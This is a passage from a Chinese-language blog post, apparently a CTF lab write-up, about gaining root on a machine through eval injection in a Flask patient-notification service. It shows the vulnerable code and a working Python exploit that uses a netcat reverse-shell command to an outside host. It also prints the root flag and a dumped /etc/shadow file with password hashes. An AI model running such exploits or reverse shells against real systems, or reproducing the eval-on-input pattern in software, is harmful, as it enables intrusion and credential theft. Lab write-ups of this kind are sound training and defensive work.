supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 404 NOT FOUND</span><br><span class="line">&lt; Server: Werkzeug/2.2.2 Python/3.11.2</span><br><span class="line">&lt; Date: Sat, 21 Feb 2026 21:10:07 GMT</span><br><span class="line">&lt; Content-Type: text/html; charset=utf-8</span><br><span class="line">&lt; Content-Length: 207</span><br><span class="line">&lt; Connection: close</span><br><span class="line">&lt; </span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=en&gt;</span><br><span class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</span><br><span class="line">* Closing connection 0</span><br></pre></td></tr></table></figure>
+
+<p>注意到运行的进程中有 root 启动的进程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root        3500  0.0  0.8 1055696 34976 ?       Ss   Feb19   0:55 /usr/bin/python3 /usr/local/bin/notif.py</span><br></pre></td></tr></table></figure>
+
+<p>查看 <code>/usr/local/bin/notif.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Notification server for added patients.</span></span><br><span class="line"><span class="string">This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.</span></span><br><span class="line"><span class="string">It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.</span></span><br><span class="line"><span class="string">It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, abort</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET, os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">USER_DIR = <span class="string">&quot;/var/secure-health/patients/&quot;</span>; os.makedirs(USER_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>(<span class="params">first, last, sender, ts, dob, gender</span>):</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;^[a-zA-Z0-9._&#x27;\&quot;()&#123;&#125;=+/]+$&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> [first, last, sender, ts, dob, gender]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> pattern.fullmatch(s):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[INVALID_INPUT]&quot;</span></span><br><span class="line">    <span class="comment"># DOB format is DD/MM/YYYY</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        year_of_birth = <span class="built_in">int</span>(dob.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> year_of_birth &lt; <span class="number">1900</span> <span class="keyword">or</span> year_of_birth &gt; datetime.now().year:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[INVALID_DOB]&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[INVALID_DOB]&quot;</span></span><br><span class="line">    template = <span class="string">f&quot;Patient <span class="subst">&#123;first&#125;</span> <span class="subst">&#123;last&#125;</span> (<span class="subst">&#123;gender&#125;</span>), &#123;&#123;datetime.now().year - year_of_birth&#125;&#125; years old, received from <span class="subst">&#123;sender&#125;</span> at <span class="subst">&#123;ts&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>(<span class="string">f&quot;f&#x27;&#x27;&#x27;<span class="subst">&#123;template&#125;</span>&#x27;&#x27;&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;[EVAL_ERROR] <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/addPatient&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive</span>():</span><br><span class="line">    <span class="keyword">if</span> request.remote_addr != <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        xml_text = request.data.decode()</span><br><span class="line">        xml_root = ET.fromstring(xml_text)</span><br><span class="line">    <span class="keyword">except</span> ET.ParseError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;XML ERROR\n&quot;</span>, <span class="number">400</span></span><br><span class="line">    patient = xml_root <span class="keyword">if</span> xml_root.tag==<span class="string">&quot;patient&quot;</span> <span class="keyword">else</span> xml_root.find(<span class="string">&quot;patient&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> patient <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No &lt;patient&gt; tag found\n&quot;</span>, <span class="number">400</span></span><br><span class="line">    <span class="built_in">id</span> = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">    data = &#123;tag: (patient.findtext(tag) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>) <span class="keyword">for</span> tag <span class="keyword">in</span> [<span class="string">&quot;firstname&quot;</span>,<span class="string">&quot;lastname&quot;</span>,<span class="string">&quot;sender_app&quot;</span>,<span class="string">&quot;timestamp&quot;</span>,<span class="string">&quot;birth_date&quot;</span>,<span class="string">&quot;gender&quot;</span>]&#125;</span><br><span class="line">    notification = template(data[<span class="string">&quot;firstname&quot;</span>],data[<span class="string">&quot;lastname&quot;</span>],data[<span class="string">&quot;sender_app&quot;</span>],data[<span class="string">&quot;timestamp&quot;</span>],data[<span class="string">&quot;birth_date&quot;</span>],data[<span class="string">&quot;gender&quot;</span>])</span><br><span class="line">    path = os.path.join(USER_DIR,<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(notification+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> notification</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">54321</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>应用中执行了 eval，可以利用这个实现 rce</p>
+<p>exp 反弹 shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">TARGET = <span class="string">&quot;http://240.0.0.1:54321/addPatient&quot;</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;nc 10.10.16.2 6666 -e /bin/bash&quot;</span>.encode().<span class="built_in">hex</span>()</span><br><span class="line">rce_payload = <span class="string">&quot;&#123;&quot;</span> + <span class="string">f&quot;__import__(&#x27;os&#x27;).system(bytes.fromhex(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;).decode())&quot;</span> + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">xml_data = <span class="string">f&quot;&quot;&quot;&lt;patient&gt;</span></span><br><span class="line"><span class="string">    &lt;firstname&gt;&lt;![CDATA[<span class="subst">&#123;rce_payload&#125;</span>]]&gt;&lt;/firstname&gt;</span></span><br><span class="line"><span class="string">    &lt;lastname&gt;Hacker&lt;/lastname&gt;</span></span><br><span class="line"><span class="string">    &lt;sender_app&gt;Mirth&lt;/sender_app&gt;</span></span><br><span class="line"><span class="string">    &lt;timestamp&gt;2026&lt;/timestamp&gt;</span></span><br><span class="line"><span class="string">    &lt;birth_date&gt;01/01/2000&lt;/birth_date&gt;</span></span><br><span class="line"><span class="string">    &lt;gender&gt;M&lt;/gender&gt;</span></span><br><span class="line"><span class="string">&lt;/patient&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 发送 Payload 到 <span class="subst">&#123;TARGET&#125;</span>...&quot;</span>)</span><br><span class="line">    r = requests.post(TARGET, data=xml_data, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 状态码: <span class="subst">&#123;r.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 服务器返回: <span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 请求结束，请检查你的 nc 监听器。&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>root flag</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line">6fd2f58175f647374fb4b2b681b79af1</span><br></pre></td></tr></table></figure>
+
+<h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$o.VVihLzQteSMxpHLdRkO.$ye7gwugB75H18vxlZ9Yp8uak36M3opreZHoWrWOJto7:20307:0:99999:7:::</span><br><span class="line">daemon:*:20307:0:99999:7:::</span><br><span class="line">bin:*:20307:0:99999:7:::</span><br><span class="line">sys:*:20307:0:99999:7:::</span><br><span class="line">sync:*:20307:0:99999:7:::</span><br><span class="line">games:*:20307:0:99999:7:::</span><br><span class="line">man:*:20307:0:99999:7:::</span><br><span class="line">lp:*:20307:0:99999:7:::</span><br><span class="line">mail:*:20307:0:99999:7:::</span><br><span class="line">news:*:20307:0:99999:7:::</span><br><span class="line">uucp:*:20307:0:99999:7:::</span><br><span class="line">proxy:*:20307:0:99999:7:::</span><br><span class="line">www-data:*:20307:0:99999:7:::</span><br><span class="line">backup:*:20307:0:99999:7:::</span><br><span class="line">list:*:20307:0:99999:7:::</span><br><span class="line">irc:*:20307:0:99999:7:::</span><br><span class="line">_apt:*:20307:0:99999:7:::</span><br><span class="line">nobody:*:20307:0:99999:7:::</span><br><span class="line">systemd-network:!*:20307::::::</span><br><span class="line">systemd-timesync:!*:20307::::::</span><br><span class="line">messagebus:!:20307::::::</span><br><span class="line">avahi-autoipd:!:20307::::::</span><br><span class="line">sshd:!:20307::::::</span><br><span class="line">sedric:$y$j9T$MMATL11rB9egotaJXLTma0$VZ43M7Rr6.Ls7g8gZwoPCRWIXi6Wjv8j/d8iublq1nB:20495:0:99999:7:::</span><br><span class="line">mirth:!:20311::::::</span><br><span class="line">mysql:!:20350::::::</span><br><span class="line">_laurel:!:20496::::::</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/02/20/Season10-WingData/" rel="prev" title="[Season10] WingData WP">
+                  <i class="fa fa-angle-left"></i> [Season10] WingData WP
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">l1nk</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
